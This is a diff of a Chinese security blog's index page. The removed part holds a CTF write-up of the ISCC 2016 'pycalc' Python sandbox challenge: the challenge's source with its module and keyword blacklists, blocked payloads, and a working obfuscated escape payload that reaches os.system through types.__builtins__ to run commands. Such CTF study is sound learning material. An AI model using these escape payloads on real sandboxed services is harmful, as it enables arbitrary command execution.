-<h2 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h2><p>这个例子来自<code>iscc 2016</code>的<code>Pwn300 pycalc</code>，相当有趣：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python2</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">def banner():</span><br><span class="line">    print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;</span><br><span class="line">    print &quot;   Simple calculator implemented by python   &quot;</span><br><span class="line">    print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;</span><br><span class="line">    return</span><br><span class="line"></span><br><span class="line">def getexp():</span><br><span class="line">    return raw_input(&quot;&gt;&gt;&gt; &quot;)</span><br><span class="line"></span><br><span class="line">def _hook_import_(name, *args, **kwargs):</span><br><span class="line">    module_blacklist &#x3D; [&#39;os&#39;, &#39;sys&#39;, &#39;time&#39;, &#39;bdb&#39;, &#39;bsddb&#39;, &#39;cgi&#39;,</span><br><span class="line">                        &#39;CGIHTTPServer&#39;, &#39;cgitb&#39;, &#39;compileall&#39;, &#39;ctypes&#39;, &#39;dircache&#39;,</span><br><span class="line">                        &#39;doctest&#39;, &#39;dumbdbm&#39;, &#39;filecmp&#39;, &#39;fileinput&#39;, &#39;ftplib&#39;, &#39;gzip&#39;,</span><br><span class="line">                        &#39;getopt&#39;, &#39;getpass&#39;, &#39;gettext&#39;, &#39;httplib&#39;, &#39;importlib&#39;, &#39;imputil&#39;,</span><br><span class="line">                        &#39;linecache&#39;, &#39;macpath&#39;, &#39;mailbox&#39;, &#39;mailcap&#39;, &#39;mhlib&#39;, &#39;mimetools&#39;,</span><br><span class="line">                        &#39;mimetypes&#39;, &#39;modulefinder&#39;, &#39;multiprocessing&#39;, &#39;netrc&#39;, &#39;new&#39;,</span><br><span class="line">                        &#39;optparse&#39;, &#39;pdb&#39;, &#39;pipes&#39;, &#39;pkgutil&#39;, &#39;platform&#39;, &#39;popen2&#39;, &#39;poplib&#39;,</span><br><span class="line">                        &#39;posix&#39;, &#39;posixfile&#39;, &#39;profile&#39;, &#39;pstats&#39;, &#39;pty&#39;, &#39;py_compile&#39;,</span><br><span class="line">                        &#39;pyclbr&#39;, &#39;pydoc&#39;, &#39;rexec&#39;, &#39;runpy&#39;, &#39;shlex&#39;, &#39;shutil&#39;, &#39;SimpleHTTPServer&#39;,</span><br><span class="line">                        &#39;SimpleXMLRPCServer&#39;, &#39;site&#39;, &#39;smtpd&#39;, &#39;socket&#39;, &#39;SocketServer&#39;,</span><br><span class="line">                        &#39;subprocess&#39;, &#39;sysconfig&#39;, &#39;tabnanny&#39;, &#39;tarfile&#39;, &#39;telnetlib&#39;,</span><br><span class="line">                        &#39;tempfile&#39;, &#39;Tix&#39;, &#39;trace&#39;, &#39;turtle&#39;, &#39;urllib&#39;, &#39;urllib2&#39;,</span><br><span class="line">                        &#39;user&#39;, &#39;uu&#39;, &#39;webbrowser&#39;, &#39;whichdb&#39;, &#39;zipfile&#39;, &#39;zipimport&#39;]</span><br><span class="line">    for forbid in module_blacklist:</span><br><span class="line">        if name &#x3D;&#x3D; forbid:        # don&#39;t let user import these modules</span><br><span class="line">            raise RuntimeError(&#39;No you can\&#39; import &#123;0&#125;!!!&#39;.format(forbid))</span><br><span class="line">    # normal modules can be imported</span><br><span class="line">    return __import__(name, *args, **kwargs)</span><br><span class="line"></span><br><span class="line">def sandbox_filter(command):</span><br><span class="line">    blacklist &#x3D; [&#39;exec&#39;, &#39;sh&#39;, &#39;__getitem__&#39;, &#39;__setitem__&#39;,</span><br><span class="line">                 &#39;&#x3D;&#39;, &#39;open&#39;, &#39;read&#39;, &#39;sys&#39;, &#39;;&#39;, &#39;os&#39;]</span><br><span class="line">    for forbid in blacklist:</span><br><span class="line">        if forbid in command:</span><br><span class="line">            return 0</span><br><span class="line">    return 1</span><br><span class="line"></span><br><span class="line">def sandbox_exec(command):      # sandbox user input</span><br><span class="line">    result &#x3D; 0</span><br><span class="line">    __sandboxed_builtins__ &#x3D; dict(__builtins__.__dict__)</span><br><span class="line">    __sandboxed_builtins__[&#39;__import__&#39;] &#x3D; _hook_import_    # hook import</span><br><span class="line">    del __sandboxed_builtins__[&#39;open&#39;]</span><br><span class="line">    _global &#x3D; &#123;</span><br><span class="line">        &#39;__builtins__&#39;: __sandboxed_builtins__</span><br><span class="line">    &#125;</span><br><span class="line">    if sandbox_filter(command) &#x3D;&#x3D; 0:</span><br><span class="line">        print &#39;Malicious user input detected!!!&#39;</span><br><span class="line">        exit(0)</span><br><span class="line">    command &#x3D; &#39;result &#x3D; &#39; + command</span><br><span class="line">    try:</span><br><span class="line">        exec command in _global     # do calculate in a sandboxed environment</span><br><span class="line">    except Exception, e:</span><br><span class="line">        print e</span><br><span class="line">        return 0</span><br><span class="line">    result &#x3D; _global[&#39;result&#39;]  # extract the result</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">banner()</span><br><span class="line">while 1:</span><br><span class="line">    command &#x3D; getexp()</span><br><span class="line">    print sandbox_exec(command)</span><br></pre></td></tr></table></figure>
-
-<p><code>exec command in _global</code> 这一句就把很多 payload 干掉了，由于 exec 运行在自定义的全局命名空间里，这时候会处于<code>restricted execution mode</code>，这里不赘述了，感兴趣可以看这篇文章：<a href="http://tav.espians.com/paving-the-way-to-securing-the-python-interpreter.html" target="_blank" rel="noopener">传送门</a>。exec 加上定制的 globals 会使得沙箱安全很多，一些常规的 payload 是没法使用的，例如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__</span><br><span class="line">restricted attribute</span><br><span class="line">&gt;&gt;&gt; getattr(getattr(__import__(&#39;types&#39;), &#39;FileType&#39;)(&#39;key&#39;), &#39;re&#39;&#39;ad&#39;)()</span><br><span class="line">file() constructor not accessible in restricted mode</span><br></pre></td></tr></table></figure>
-
-<p>不过也正是由于 exec 运行在特定的命名空间里，可以通过其他命名空间里的 <code>__builtins__</code>，比如 types 库，来执行任意命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; getattr(__import__(&#39;types&#39;).__builtins__[&#39;__tropmi__&#39;[::-1]](&#39;so&#39;[::-1]), &#39;mets&#39; &#39;ys&#39;[::-1])(&#39;whoami&#39;)</span><br><span class="line">macr0phag3</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/07/ssti/" data-id="ckfjo925e0007ywel2rqj6w1k" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
     
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
   </nav>
 
 </section>
@@ -874,7 +654,7 @@ for (i = 0; i &lt; s.length(); i++) {
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li></ul>
     </div>
   </div>
 
@@ -887,23 +667,23 @@ for (i = 0; i &lt; s.length(); i++) {
       <ul>
         
           <li>
+            <a href="/2021/05/08/pycharm%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E6%9C%8D%E5%8A%A1%E5%99%A8/">pycharm远程连接服务器</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/10/%E9%80%86%E5%90%91%E5%B7%A5%E5%85%B7/">逆向工具</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/06/matlab/">matlab</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/03/sklearn/">sklearn</a>
+          </li>
+        
+          <li>
             <a href="/2021/03/17/Hill/">Hill</a>
-          </li>
-        
-          <li>
-            <a href="/2021/03/16/matrix/">matrix</a>
-          </li>
-        
-          <li>
-            <a href="/2020/11/22/tenserflow-python/">tenserflow+python</a>
-          </li>
-        
-          <li>
-            <a href="/2020/10/28/%E5%9B%BD%E7%8E%8B%E7%9A%84%E7%83%A6%E6%81%BC/">国王的烦恼</a>
-          </li>
-        
-          <li>
-            <a href="/2020/10/25/%E5%9C%B0%E5%AE%AB/">地宫</a>
           </li>
         
       </ul>
